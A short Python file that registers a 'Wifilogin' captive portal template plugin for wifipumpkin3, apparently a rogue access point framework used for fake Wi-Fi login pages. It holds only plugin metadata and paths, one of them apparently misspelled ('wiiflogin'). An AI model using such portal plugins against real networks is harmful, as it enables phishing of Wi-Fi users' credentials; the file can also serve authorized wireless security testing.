from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
import wifipumpkin3.core.utility.constants as C # import plugin class base

class ExamplePlugin(CaptiveTemplatePlugin):
    Name = "Wifilogin"
    Version = "1.0"
    Description = "Example is a simple portal default page"
    Author = "prilzexk"
    TemplatePath = C.TEMPLATES_FLASK + "templates/wiiflogin"
    StaticPath = C.TEMPLATES_FLASK + "templates/Wifilogin/static"
    Preview = C.TEMPLATES_FLASK + "templates/Wifilogin/preview.png"